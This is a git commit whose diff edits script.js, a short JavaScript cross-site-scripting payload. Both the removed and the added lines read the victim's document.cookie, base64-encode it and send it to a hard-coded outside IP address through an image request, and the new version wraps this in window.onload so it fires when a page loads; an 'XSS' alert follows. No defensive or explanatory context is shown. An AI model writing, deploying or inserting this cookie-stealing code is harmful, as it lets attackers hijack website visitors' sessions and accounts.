6b88f64a5d1dd89ffa7339b0ad834f7fb199c288
rfelecT <157028039+rfelecT@users.noreply.github.com>
2024-11-30 18:00:29 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,5 @@
-var img = new Image();
-img.src = 'http://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
-alert('XSS');
+window.onload = function() {
+  var img = new Image();
+  img.src = 'http://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
+  alert('XSS');
+};
